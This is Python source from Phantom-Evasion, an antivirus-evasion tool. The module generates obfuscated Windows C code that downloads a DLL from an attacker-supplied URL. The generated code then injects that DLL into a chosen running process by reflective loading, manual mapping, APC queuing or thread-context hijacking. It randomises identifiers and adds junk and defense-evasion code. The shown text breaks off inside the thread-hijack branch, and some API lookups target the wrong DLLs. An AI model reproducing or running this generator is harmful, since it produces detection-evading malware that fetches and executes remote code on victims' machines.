
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################

import sys
sys.path.append("Modules/payloads/auxiliar")

import inject_utils

from usefull import CryptFile
from usefull import varname_creator
from usefull import WindowsDefend
from usefull import JunkInjector
from usefull import WindowsDecoyProc
from usefull import CloseDecoyProc
from usefull import CheckForBackslash
from usefull import IncludeShuffler
from usefull import WriteSource


def DownloadExecDll_C_windows(ModOpt):

    UrlTarget = ModOpt["UrlTarget"]
    Filesize = ModOpt["Filesize"]

    RandvarFsize = varname_creator()
    RandhProcess = varname_creator()
    Randentry = varname_creator()
    RandProcsnapshot = varname_creator()
    Randlpv = varname_creator()
    Randpointer = varname_creator()
    RandhInternet = varname_creator()
    RandhURL = varname_creator()
    RandvarBRead = varname_creator()
    RandvarBWritten = varname_creator()
    RandisRead = varname_creator()
    Randflag = varname_creator()
    RandhThread = varname_creator()
    Randlpv2 = varname_creator()

    ModOpt["Lpvoid"] = Randlpv

    CryptFile(ModOpt)

    if ModOpt["ExecMethod"] in ["ReflectiveDll","RD","RDAPC","RDTC"]:

        RandRvaParam = varname_creator()
        RandBaseAddrParam = varname_creator()
        RandFuncRva2Offset = varname_creator()
        RandIndex = varname_creator()
        RandSectHeader = varname_creator()
        RandNtHeader = varname_creator()
        RandBaseAddr = varname_creator()
        RandExportDir = varname_creator()
        RandArrName = varname_creator()
        RandArrAddr = varname_creator()
        RandOrdName = varname_creator()
        RandLoaderOffset = varname_creator()
        RandExportedFunc = varname_creator()
        RandCounter = varname_creator()

    elif ModOpt["ExecMethod"] in ["ManualMap","MM"]:

        RandLoadLib = varname_creator()
        RandGetProcAddr = varname_creator()
        RandPdllMain = varname_creator()
        RandLoadStruct = varname_creator()
        RandImgDosHeader = varname_creator()
        RandImgNTHeader = varname_creator()
        RandImgSectHeader = varname_creator()
        RandhModule = varname_creator()
        Randflag2 = varname_creator()
        RandvarFunc = varname_creator()
        RandvarList = varname_creator()
        RandImgImport = varname_creator()
        RandvarEntry = varname_creator()
        RandvarDelta = varname_creator()
        RandPtrLoader = varname_creator()
        RandImgBaseReloc = varname_creator()
        RandImgImportDesc = varname_creator()
        RandFirstT = varname_creator()
        RandOrigFirstT = varname_creator()
        RandImgEntryTls = varname_creator()
        RandTlsDir = varname_creator()
        RandCallback = varname_creator()
        RandLoaderMem = varname_creator()


    Ret_code = ""

    IncludeList = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n"]

    Ret_code += IncludeShuffler(IncludeList) + "#include <tlhelp32.h>\n"

    Ret_code += "#include <wininet.h>\n"

    if ModOpt["ExecMethod"] in ["ReflectiveDll","RD","RDAPC","RDTC"]:

        Ret_code += "DWORD " + RandFuncRva2Offset + "( DWORD " + RandRvaParam + ", UINT_PTR " + RandBaseAddrParam + " ){\n"
        Ret_code += "WORD " + RandIndex + " = 0;\n"
        Ret_code += "PIMAGE_SECTION_HEADER " + RandSectHeader + " = NULL;\n"
        Ret_code += "PIMAGE_NT_HEADERS " + RandNtHeader + " = NULL;\n"
        Ret_code += RandNtHeader + " = (PIMAGE_NT_HEADERS)(" + RandBaseAddrParam + " + ((PIMAGE_DOS_HEADER)" + RandBaseAddrParam + ")->e_lfanew);\n"
        Ret_code += RandSectHeader + " = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&" + RandNtHeader + "->OptionalHeader) + " + RandNtHeader + "->FileHeader.SizeOfOptionalHeader);\n"
        Ret_code += "if( " + RandRvaParam + " < " + RandSectHeader + "[0].PointerToRawData )\n"
        Ret_code += "return " + RandRvaParam + ";\n"
        Ret_code += "for( " + RandIndex + "=0 ; " + RandIndex + " < " + RandNtHeader + "->FileHeader.NumberOfSections ; " + RandIndex + "++ ){\n"
        Ret_code += "if( " + RandRvaParam + " >= " + RandSectHeader + "[" + RandIndex + "].VirtualAddress && " + RandRvaParam + " < (" + RandSectHeader + "[" + RandIndex + "].VirtualAddress + " + RandSectHeader + "[" + RandIndex + "].SizeOfRawData) )\n"
        Ret_code += "return ( " + RandRvaParam + " - " + RandSectHeader + "[" + RandIndex + "].VirtualAddress + " + RandSectHeader + "[" + RandIndex + "].PointerToRawData );}\n"
        Ret_code += "return 0;}\n"

    elif ModOpt["ExecMethod"] in ["ManualMap","MM"]:

        Ret_code += "typedef HMODULE (WINAPI * " + RandLoadLib + ")(LPCSTR);\n"
        Ret_code += "typedef FARPROC (WINAPI * " + RandGetProcAddr+ ")(HMODULE,LPCSTR);\n"
        Ret_code += "typedef BOOL (WINAPI * " + RandPdllMain + ")(HMODULE,DWORD,LPVOID);\n"
        #Ret_code += "typedef BOOL (NTAPI *pRtlAddFunctionTable)(PRUNTIME_FUNCTION,DWORD,DWORD64);\n"
 
        Ret_code += "typedef struct _" + RandLoadStruct + "{"
        Ret_code += "LPVOID ImageBase;"
        Ret_code += "PIMAGE_NT_HEADERS NtHeaders;"
        Ret_code += "PIMAGE_BASE_RELOCATION BaseRelocation;"
        Ret_code += "PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;"
        Ret_code += RandLoadLib + " fnLoadLibraryA;"
        Ret_code += RandGetProcAddr+ " fnGetProcAddress;"
        #Ret_code += "pRtlAddFunctionTable fnRtlAddFunctionTable;\n"
        Ret_code += "}" + RandLoadStruct + ",*P" + RandLoadStruct + ";\n"
 
        Ret_code += "static SIZE_T WINAPI LoadDll(LPVOID p){\n"
        Ret_code += "P" + RandLoadStruct + " " + RandPtrLoader+ " = (P" + RandLoadStruct + ")p;\n"
        Ret_code += "HMODULE " + RandhModule + ";\n"
        Ret_code += "DWORD " + Randflag2 + "," + Randflag + ";\n"
        Ret_code += "DWORD " + RandvarFunc + ";\n"
        Ret_code += "PWORD " + RandvarList + ";\n"
        Ret_code += "PIMAGE_IMPORT_BY_NAME " + RandImgImport + ";\n"
        Ret_code += RandPdllMain + " " + RandvarEntry+ ";\n"
        Ret_code += "SIZE_T " + RandvarDelta+ ";\n"
        Ret_code += RandvarDelta+ "=(SIZE_T)((LPBYTE)" + RandPtrLoader+ "->ImageBase-" + RandPtrLoader+ "->NtHeaders->OptionalHeader.ImageBase);\n"
        Ret_code += "if(" + RandvarDelta+ " != 0){\n"
        Ret_code += "PIMAGE_BASE_RELOCATION " + RandImgBaseReloc+ " = " + RandPtrLoader+ "->BaseRelocation;\n"
        Ret_code += "while(" + RandImgBaseReloc+ "->VirtualAddress){\n"
        Ret_code += "if(" + RandImgBaseReloc+ "->SizeOfBlock>=sizeof(IMAGE_BASE_RELOCATION)){\n"
        Ret_code += Randflag + "=(" + RandImgBaseReloc+ "->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);\n"
        Ret_code += RandvarList + "=(PWORD)(" + RandImgBaseReloc+ "+1);\n"
        Ret_code += "for(" + Randflag2 + "=0;" + Randflag2 + "<" + Randflag + ";" + Randflag2 + "++){\n"
        Ret_code += "if(" + RandvarList + "[" + Randflag2 + "]){\n"
        Ret_code += "PDWORD ptr=(PDWORD)((LPBYTE)" + RandPtrLoader+ "->ImageBase+(" + RandImgBaseReloc+ "->VirtualAddress+(" + RandvarList + "[" + Randflag2 + "] & 0xFFF)));\n"
        Ret_code += "*ptr+=" + RandvarDelta+ ";}}}\n"
        Ret_code += RandImgBaseReloc+ "=(PIMAGE_BASE_RELOCATION)((LPBYTE)" + RandImgBaseReloc+ "+" + RandImgBaseReloc+ "->SizeOfBlock);}}\n"
        Ret_code += "PIMAGE_IMPORT_DESCRIPTOR " + RandImgImportDesc+ " = " + RandPtrLoader+ "->ImportDirectory;\n"
        Ret_code += "PIMAGE_THUNK_DATA " + RandFirstT+ "," + RandOrigFirstT+ ";\n"
        Ret_code += "while(" + RandImgImportDesc+ "->Characteristics){\n"
        Ret_code += RandOrigFirstT + "=(PIMAGE_THUNK_DATA)((LPBYTE)" + RandPtrLoader+ "->ImageBase+" + RandImgImportDesc+ "->OriginalFirstThunk);\n"
        Ret_code += RandFirstT+ "=(PIMAGE_THUNK_DATA)((LPBYTE)" + RandPtrLoader+ "->ImageBase+" + RandImgImportDesc+ "-> FirstThunk);\n"
        Ret_code += RandhModule + "=" + RandPtrLoader+ "->fnLoadLibraryA((LPCSTR)" + RandPtrLoader+ "->ImageBase+" + RandImgImportDesc+ "->Name);\n"
        Ret_code += "while(" + RandOrigFirstT+ "->u1.AddressOfData){\n"
        Ret_code += "if(" + RandOrigFirstT+ "->u1.Ordinal & IMAGE_ORDINAL_FLAG){\n"
        Ret_code += RandvarFunc + "=(DWORD)" + RandPtrLoader+ "->fnGetProcAddress(" + RandhModule + ",(LPCSTR)(" + RandOrigFirstT+ "->u1.Ordinal & 0xFFFF)); \n"
        Ret_code += RandFirstT+ "->u1.Function=" + RandvarFunc + ";}\n"
        Ret_code += "else{\n"
        Ret_code += RandImgImport + "=(PIMAGE_IMPORT_BY_NAME)((LPBYTE)" + RandPtrLoader+ "->ImageBase+" + RandOrigFirstT+ "->u1.AddressOfData);\n"
        Ret_code += RandvarFunc + "=(DWORD)" + RandPtrLoader+ "->fnGetProcAddress(" + RandhModule + ",(LPCSTR)" + RandImgImport + "->Name);\n"
        Ret_code += RandFirstT+ "->u1.Function=" + RandvarFunc + ";}\n"
        Ret_code += RandOrigFirstT+ "++;\n"
        Ret_code += RandFirstT+ "++;}" + RandImgImportDesc+ "++;}\n"
        #Ret_code += "IMAGE_DATA_DIRECTORY " + RandImgEntryTls+ " = " + RandPtrLoader+ "->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];\n"
        #Ret_code += "if(" + RandImgEntryTls+ ".VirtualAddress != 0){\n"
        #Ret_code += "PIMAGE_TLS_DIRECTORY " + RandTlsDir+ " = (PIMAGE_TLS_DIRECTORY)((LPBYTE)" + RandPtrLoader+ "->ImageBase + " + RandImgEntryTls+ ".VirtualAddress);\n"
        #Ret_code += "PIMAGE_TLS_CALLBACK *" + RandCallback+ " = (PIMAGE_TLS_CALLBACK *)" + RandTlsDir+ "->AddressOfCallBacks;\n"
        #Ret_code += "if(" + RandCallback+ "){\n"
        #Ret_code += "while (*" + RandCallback+ "){\n"
        #Ret_code += "(*" + RandCallback+ ")((HMODULE)" + RandPtrLoader + "->ImageBase, DLL_PROCESS_ATTACH, NULL);\n"
        #Ret_code += RandCallback+ "++;}}}\n"
 
        Ret_code += "if(" + RandPtrLoader+ "->NtHeaders->OptionalHeader.AddressOfEntryPoint){\n"
        Ret_code += RandvarEntry+ "=( " + RandPdllMain + ")((LPBYTE)" + RandPtrLoader+ "->ImageBase+" + RandPtrLoader+ "->NtHeaders->OptionalHeader.AddressOfEntryPoint);\n"
        Ret_code += "return " + RandvarEntry+ "((HMODULE)(" + RandPtrLoader+ "->ImageBase),DLL_PROCESS_ATTACH,NULL);}\n"
        Ret_code += "return TRUE;}\n"

        Ret_code += "static SIZE_T WINAPI LoadDllEnd(){return 0;}\n"

    #Ret_code += "#define CountRelocationEntries(dwBlockSize) (dwBlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY)\n"

    if ModOpt["Outformat"] == "exe":

        Ret_code += "int main(int argc,char * argv[]){\n"

    elif ModOpt["Outformat"] == "dll":

        Ret_code += "BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD dwReason,LPVOID lpReserved){\n"
        Ret_code += "BOOL bReturnValue = TRUE;\n"
        Ret_code += "if(dwReason ==  DLL_PROCESS_ATTACH){\n"

    Ret_code += "$:START\n"

    Ret_code += WindowsDefend(ModOpt)

    #Ret_code += WindowsDecoyProc(ModOpt["DecoyProc"])

    Ret_code += "$:EVA\n"

    Ret_code += "PROCESSENTRY32 " + Randentry + ";\n"
    Ret_code += Randentry + ".dwSize = sizeof(PROCESSENTRY32);\n"

    if ModOpt["DynImport"] == True:

        ModOpt["NtdllHandle"] = varname_creator()
        ModOpt["Ker32Handle"] = varname_creator()
        Wininet = varname_creator()
        NdcTl32Snapshot = varname_creator()
        NdcProcess32First = varname_creator()
        NdcProcess32Next = varname_creator()
        NdcOpenProcess = varname_creator()

        Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"
        Ret_code += "HANDLE " + ModOpt["Ker32Handle"] + " = GetModuleHandle(\"kernel32.dll\");\n"
        Ret_code += "HANDLE " + Wininet + " = GetModuleHandle(\"wininet.dll\");\n" 
        Ret_code += "FARPROC " + NdcTl32Snapshot + " = GetProcAddress(" + Wininet + ", \"CreateToolhelp32Snapshot\");\n"
        Ret_code += "FARPROC " + NdcProcess32First + " = GetProcAddress(" + Wininet + ", \"Process32First\");\n"
        Ret_code += "FARPROC " + NdcProcess32Next + " = GetProcAddress(" + Wininet + ", \"Process32Next\");\n"
        Ret_code += "HANDLE " + RandProcsnapshot + " = (HANDLE)" + NdcTl32Snapshot + "(TH32CS_SNAPPROCESS, 0);\n"
        Ret_code += "if(" + NdcProcess32First + "(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
        Ret_code += "while(" + NdcProcess32Next + "(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
        Ret_code += "if(strcmp(" + Randentry + ".szExeFile,\"" + ModOpt["ProcTarget"] + "\") == 0){\n"
        Ret_code += "FARPROC " + NdcOpenProcess + " = GetProcAddress(" + Wininet + ", \"OpenProcess\");\n"
        Ret_code += "HANDLE " + RandhProcess + " = (HANDLE)" + NdcOpenProcess + "(PROCESS_ALL_ACCESS, FALSE," + Randentry + ".th32ProcessID);\n"

    else:

        Ret_code += "HANDLE " + RandProcsnapshot + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
        Ret_code += "if (Process32First(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
        Ret_code += "while (Process32Next(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
        Ret_code += "if(strcmp(" + Randentry + ".szExeFile,\"" + ModOpt["ProcTarget"] + "\") == 0){\n"
        Ret_code += "HANDLE " + RandhProcess + " = OpenProcess(PROCESS_ALL_ACCESS, FALSE," + Randentry + ".th32ProcessID);\n"


    Ret_code += "int " + RandvarFsize + " = " + ModOpt["Filesize"] + ";\n"
    Ret_code += "DWORD " + RandvarBWritten +  " = 0;\n"

    if ModOpt["DynImport"] == True:

        NdcInternetOpenA = varname_creator()
        NdcInternetOpenUrl = varname_creator()
        NdcVirtualAlloc = varname_creator()
        NdcInternetReadFile = varname_creator()
 
        Ret_code += "FARPROC " + NdcInternetOpenA + " = GetProcAddress(" + Wininet + ", \"InternetOpenA\");\n"
        Ret_code += "HINTERNET " + RandhInternet + " = (HINTERNET)" + NdcInternetOpenA + "(\"Mozilla/4.0\", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);\n"
        Ret_code += "if(" + RandhInternet + " != NULL){\n"
        Ret_code += "FARPROC " + NdcInternetOpenUrl + " = GetProcAddress(" + Wininet + ", \"InternetOpenUrl\");\n"
        Ret_code += "HINTERNET " + RandhURL + " = (HINTERNET)" + NdcInternetOpenUrl + "(" + RandhInternet + ",\"" + UrlTarget + "\",NULL, 0,INTERNET_FLAG_RESYNCHRONIZE | INTERNET_FLAG_NO_CACHE_WRITE, 0);\n"
        Ret_code += "FARPROC " + NdcVirtualAlloc + " = GetProcAddress(" + Wininet + ", \"VirtualAlloc\");\n"
        Ret_code += "unsigned char * " + Randlpv + " = (LPVOID)" + NdcVirtualAlloc + "(0," + RandvarFsize + ", MEM_COMMIT, PAGE_READWRITE);\n"
        Ret_code += "ZeroMemory(" + Randlpv + "," + RandvarFsize + ");\n"
        Ret_code += "char * " + Randpointer + " = " + Randlpv + ";\n"
        Ret_code += "DWORD " + RandvarBRead + ";\n"
        Ret_code += "do{\n"
        Ret_code += "FARPROC " + NdcInternetReadFile + " = GetProcAddress(" + Wininet + ", \"InternetReadFile\");\n"
        Ret_code += "BOOL " + RandisRead + " = " + NdcInternetReadFile + "(" + RandhURL + "," + Randpointer + ", 1024, &" + RandvarBRead + ");\n"
    else:

        Ret_code += "HINTERNET " + RandhInternet +  " = InternetOpenA(\"Mozilla/4.0\", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);\n"
        Ret_code += "if(" + RandhInternet +  " != NULL){\n"
        Ret_code += "HINTERNET " + RandhURL + " = InternetOpenUrl(" + RandhInternet +  ",\"" + ModOpt["UrlTarget"] + "\",NULL, 0,INTERNET_FLAG_RESYNCHRONIZE | INTERNET_FLAG_NO_CACHE_WRITE, 0);\n"
        Ret_code += "unsigned char * " + Randlpv +  " = VirtualAlloc(0," + RandvarFsize + ", MEM_COMMIT, PAGE_READWRITE);\n"
        Ret_code += "ZeroMemory(" + Randlpv +  "," + RandvarFsize + ");\n"
        Ret_code += "char * " + Randpointer +  " = " + Randlpv +  ";\n"
        Ret_code += "DWORD " + RandvarBRead +  ";\n"
        Ret_code += "do{\n"
        Ret_code += "BOOL RandisRead = InternetReadFile(" + RandhURL + "," + Randpointer +  ", 1024, &" + RandvarBRead +  ");\n"

    Ret_code += Randpointer +  " += " + RandvarBRead +  ";\n"
    Ret_code += "}while(" + RandvarBRead +  " > 0);\n"

    if ModOpt["Decoder"] != "False":

        Ret_code += ModOpt["Decoder"]

    if ModOpt["ExecMethod"] in ["ReflectiveDll","RD","RDAPC","RDTC"]:

        Ret_code += "UINT_PTR " + RandBaseAddr +  " = (UINT_PTR)" + Randlpv +  ";\n"
        Ret_code += "UINT_PTR " + RandExportDir +  " = " + RandBaseAddr +  " + ((PIMAGE_DOS_HEADER)" + RandBaseAddr +  ")->e_lfanew;\n"
        Ret_code += "UINT_PTR " + RandArrName +  " = (UINT_PTR)&((PIMAGE_NT_HEADERS)" + RandExportDir +  ")->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];\n"
        Ret_code += RandExportDir +  " = " + RandBaseAddr +  " + " + RandFuncRva2Offset + "(((PIMAGE_DATA_DIRECTORY)" + RandArrName +  ")->VirtualAddress, " + RandBaseAddr +  " );\n"
        Ret_code += RandArrName +  " = " + RandBaseAddr +  " + " + RandFuncRva2Offset + "(((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir +  ")->AddressOfNames, " + RandBaseAddr +  " );\n"
        Ret_code += "UINT_PTR " + RandArrAddr +  " = " + RandBaseAddr +  " + " + RandFuncRva2Offset + "(((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir +  ")->AddressOfFunctions, " + RandBaseAddr +  " );\n"
        Ret_code += "UINT_PTR " + RandOrdName +  " = " + RandBaseAddr +  " + " + RandFuncRva2Offset + "(((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir +  ")->AddressOfNameOrdinals, " + RandBaseAddr +  " );\n"
        Ret_code += "DWORD " + RandCounter +  " = ((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir +  ")->NumberOfNames;\n"
        Ret_code += "DWORD " + RandLoaderOffset +  ";\n"
        Ret_code += "while( " + RandCounter +  "-- ){\n"
        Ret_code += "char * " + RandExportedFunc +  " = (char *)(" + RandBaseAddr +  " + " + RandFuncRva2Offset + "(*(DWORD *)(" + RandArrName +  ")," + RandBaseAddr +  "));\n"
        Ret_code += "if(strstr( " + RandExportedFunc +  ", \"ReflectiveLoader\" ) != NULL){\n"
        Ret_code += RandArrAddr +  " = " + RandBaseAddr +  " + " + RandFuncRva2Offset + "(((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir +  ")->AddressOfFunctions, " + RandBaseAddr +  " );\n"
        Ret_code += RandArrAddr +  " += (*(WORD *)(" + RandOrdName +  ")*sizeof(DWORD));\n"
        Ret_code += RandLoaderOffset +  " = " + RandFuncRva2Offset + "(*(DWORD *)(" + RandArrAddr +  ")," + RandBaseAddr + ");}\n"
        Ret_code += RandArrName +  " += sizeof(DWORD);\n"
        Ret_code += RandOrdName +  " += sizeof(WORD);}\n"

        if ModOpt["DynImport"] == True:

            NdcVirtualAllocEx = varname_creator()
            NdcWriteProcessMemory = varname_creator()

            Ret_code += "FARPROC " + NdcVirtualAllocEx + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"VirtualAllocEx\");\n"
            Ret_code += "FARPROC " + NdcWriteProcessMemory + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"WriteProcessMemory\");\n"
            Ret_code += "LPVOID " + Randlpv2 +  " = (LPVOID)" + NdcVirtualAllocEx + "(" + RandhProcess +  ",NULL," + RandvarFsize +  ",MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);\n"
            Ret_code += NdcWriteProcessMemory + "(" + RandhProcess +  "," + Randlpv2 +  "," + Randlpv +  "," + RandvarFsize +  ",NULL);\n"

        else:

            Ret_code += "LPVOID " + Randlpv2 +  " = VirtualAllocEx(" + RandhProcess +  ",NULL," + RandvarFsize +  ",MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);\n"
            Ret_code += "WriteProcessMemory(" + RandhProcess +  "," + Randlpv2 +  "," + Randlpv +  "," + RandvarFsize +  ",NULL);\n"

        if "APC" in ModOpt["ExecMethod"]:

            RandThreadsnapshot = varname_creator()
            RandTargetThread = varname_creator()
            RandTentry = varname_creator()
            RandAPC = varname_creator()


            Ret_code += "HANDLE " + RandThreadsnapshot + " = INVALID_HANDLE_VALUE;\n"
            Ret_code += "THREADENTRY32 " + RandTentry + ";\n"
            Ret_code += RandTentry + ".dwSize = sizeof(THREADENTRY32);\n"
            Ret_code += "PTHREAD_START_ROUTINE " + RandAPC + " = (PTHREAD_START_ROUTINE)((ULONG_PTR)" + Randlpv2 +  "+" + RandLoaderOffset + ");\n" 

            if ModOpt["DynImport"] == True:
                User32 = varname_creator()

                NdcThread32First = varname_creator()
                NdcThread32Next = varname_creator()
                NdcOpenThread = varname_creator()
                NdcQueueAPC = varname_creator()

                Ret_code += "HANDLE " + User32 + " = GetModuleHandle(\"user32.dll\");\n"
                Ret_code += "FARPROC " + NdcThread32First + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"Thread32First\");\n"
                Ret_code += "FARPROC " + NdcThread32Next + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"Thread32Next\");\n"
                Ret_code += "FARPROC " + NdcOpenThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"OpenThread\");\n"
                Ret_code += "FARPROC " + NdcQueueAPC + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"QueueUserAPC\");\n"
                Ret_code += RandThreadsnapshot + " = (HANDLE)" + NdcTl32Snapshot + "(TH32CS_SNAPTHREAD,0);\n"
                Ret_code += "if(" + RandThreadsnapshot + " != INVALID_HANDLE_VALUE){\n"
                Ret_code += "if(!" + NdcThread32First + "(" + RandThreadsnapshot + ",&" + RandTentry + ")){ CloseHandle(" + RandThreadsnapshot + ");}\n"
                Ret_code += "do{\n"
                Ret_code += "if(" + RandTentry + ".th32OwnerProcessID == " + Randentry + ".th32ProcessID){\n"
                Ret_code += "HANDLE " + RandTargetThread + " = (HANDLE)" + NdcOpenThread + "(THREAD_ALL_ACCESS ,FALSE," + RandTentry + ".th32ThreadID);\n"
                Ret_code += "if(" + RandTargetThread + " != NULL){\n"
                Ret_code += NdcQueueAPC + "((PAPCFUNC)" + RandAPC + "," + RandTargetThread + ",(ULONG_PTR)NULL);}}\n"
                Ret_code += "}while(" + NdcThread32Next + "(" + RandThreadsnapshot + ",&" + RandTentry + "));}\n"

            else:

                Ret_code += RandThreadsnapshot + " = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);\n"
                Ret_code += "if(" + RandThreadsnapshot + " != INVALID_HANDLE_VALUE){\n"
                Ret_code += "if(!Thread32First(" + RandThreadsnapshot + ",&" + RandTentry + ")){ CloseHandle(" + RandThreadsnapshot +");}\n"                
                Ret_code += "do{\n"
                Ret_code += "if(" + RandTentry + ".th32OwnerProcessID == " + Randentry + ".th32ProcessID){\n"
                Ret_code += "HANDLE " + RandTargetThread + " = OpenThread(THREAD_ALL_ACCESS ,FALSE," + RandTentry + ".th32ThreadID);\n"
                Ret_code += "if(" + RandTargetThread + " != NULL){\n"
                Ret_code += "QueueUserAPC((PAPCFUNC)" + RandAPC + "," + RandTargetThread + ",(ULONG_PTR)NULL);}}\n"
                Ret_code += "}while(Thread32Next(" + RandThreadsnapshot + ",&" + RandTentry + "));}\n"


        elif "TC" in ModOpt["ExecMethod"]:
   
            RandThreadsnapshot = varname_creator()
            RandTargetThread = varname_creator()
            RandTentry = varname_creator()
            RandContext = varname_creator()
            RandRemCtx = varname_creator()
            RandRemStack = varname_creator()


            Ret_code += "HANDLE " + RandThreadsnapshot + " = INVALID_HANDLE_VALUE;\n" 
            Ret_code += "THREADENTRY32 " + RandTentry + ";\n" 

            if ModOpt["DynImport"] == True:
                NdcThread32First = varname_creator()
                NdcThread32Next = varname_creator()
                NdcOpenThread = varname_creator()
                NdcSuspendThread = varname_creator()
                NdcGetThreadContext = varname_creator()
                NdcSetThreadContext = varname_creator()
                NdcResumeThread = varname_creator()
                #NdcTl32Snapshot = varname_creator()
                #Ret_code += "HANDLE " + User32 + " = GetModuleHandle(\"user32.dll\");\n"
                Ret_code += "FARPROC " + NdcThread32First + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"Thread32First\");\n"
                Ret_code += "FARPROC " + NdcThread32Next + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"Thread32Next\");\n"
                Ret_code += "FARPROC " + NdcOpenThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"OpenThread\");\n"
                Ret_code += RandThreadsnapshot + " = (HANDLE)" + NdcTl32Snapshot + "(TH32CS_SNAPTHREAD,0);\n"
                Ret_code += "if(" + RandThreadsnapshot + " != INVALID_HANDLE_VALUE){\n"
                Ret_code += "if(!" + NdcThread32First + "(" + RandThreadsnapshot + ",&" + RandTentry + ")){ CloseHandle(" + RandThreadsnapshot + ");}\n"
                Ret_code += "do{\n"
                Ret_code += "if(" + RandTentry + ".th32OwnerProcessID == " + Randentry + ".th32ProcessID){\n"
                Ret_code += "HANDLE " + RandTargetThread + " = (HANDLE)" + NdcOpenThread + "(THREAD_SUSPEND_RESUME|THREAD_SET_CONTEXT|THREAD_GET_CONTEXT,FALSE," + RandTentry + ".th32ThreadID);\n"
                Ret_code += "if(" + RandTargetThread + " != NULL){\n"
                Ret_code += "CONTEXT " + RandContext + ";\n"
                Ret_code += "PVOID " + RandRemCtx + " = NULL;\n"
                Ret_code += "PVOID " + RandRemStack + " = NULL;\n"
                Ret_code += "FARPROC " + NdcSuspendThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"SuspendThread\");\n"
                Ret_code += "if(" + NdcSuspendThread + "(" + RandTargetThread + ") != -1){\n"
                Ret_code += RandContext + ".ContextFlags = CONTEXT_FULL;\n"
                Ret_code += "FARPROC " + NdcGetThreadContext + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"GetThreadContext\");\n"
                Ret_code += "if(" + NdcGetThreadContext + "(" + RandTargetThread + ",&" + RandContext + ")){\n"       
                #Ret_code += "FARPROC " + NdcVirtualAllocEx + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"VirtualAllocEx\");\n"        
                Ret_code += RandRemCtx + " = (LPVOID)" + NdcVirtualAllocEx + "(" + RandhProcess + ", NULL,sizeof(" + RandContext + "),MEM_COMMIT,PAGE_READWRITE);\n"
                #Ret_code += "FARPROC " + NdcWriteProcessMemory + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"WriteProcessMemory\");\n"                 
                Ret_code += NdcWriteProcessMemory + "(" + RandhProcess + "," + RandRemCtx + ",&" + RandContext + ",sizeof(" + RandContext + "),NULL);\n"

                if ModOpt["Arch"] == "x86":

                    Ret_code += RandContext + ".Eip = (DWORD)" + Randlpv2 +  " + " + RandLoaderOffset +  ";\n" # GIUSTO??

                elif ModOpt["Arch"] == "x64":

                    Ret_code += RandContext + ".Rip = (DWORD64)" + Randlpv2 +  " + " + RandLoaderOffset +  ";\n"
                    Ret_code += RandContext + ".Rcx = (DWORD64)" + RandRemCtx + ";\n"
                    Ret_code += NdcWriteProcessMemory + "(" + RandhProcess + ",(LPVOID)(((LPBYTE)" + Randlpv2 +  ")+2),&" + RandContext + ".Rcx,sizeof(" + RandContext + ".Rcx),NULL);\n"

                    #let stack have some room to grow up or down
                    Ret_code += RandContext + ".Rsp = " + RandContext + ".Rsp - 0x2000;\n"

                Ret_code += "FARPROC " + NdcSetThreadContext + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"SetThreadContext\");\n"
                Ret_code += NdcSetThreadContext + "(" + RandTargetThread + ",&" + RandContext + ");\n"
                Ret_code += "FARPROC " + NdcResumeThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"ResumeThread\");\n"
                Ret_code += NdcResumeThread + "(" + RandTargetThread + ");\n"
                Ret_code += "break;"
